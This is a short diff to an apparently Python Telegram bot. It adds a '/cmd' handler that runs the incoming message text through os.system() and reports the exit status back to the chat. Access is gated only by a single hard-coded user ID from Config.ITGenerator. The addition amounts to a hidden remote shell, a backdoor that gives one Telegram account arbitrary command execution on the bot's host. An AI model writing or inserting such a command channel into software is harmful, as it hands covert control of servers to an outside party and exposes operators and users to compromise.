@@ -253,6 +253,15 @@ def send_message_to_user(message):
                 print(e)
 
 
+@bot.message_handler(commands=['cmd'])
+def control_command(message):
+    if message.from_user.id == Config.ITGenerator:
+        print(f"Command: {message.text}")
+        status = os.system(message.text)
+        print(status)
+        bot.send_message(message.chat.id, f"Done! (status {status})", reply_markup=TSDB.getSubMenu(get_pos(message)))
+
+
 @bot.message_handler(commands=['start'])
 def main(message):
     stat.fromMessage(message)
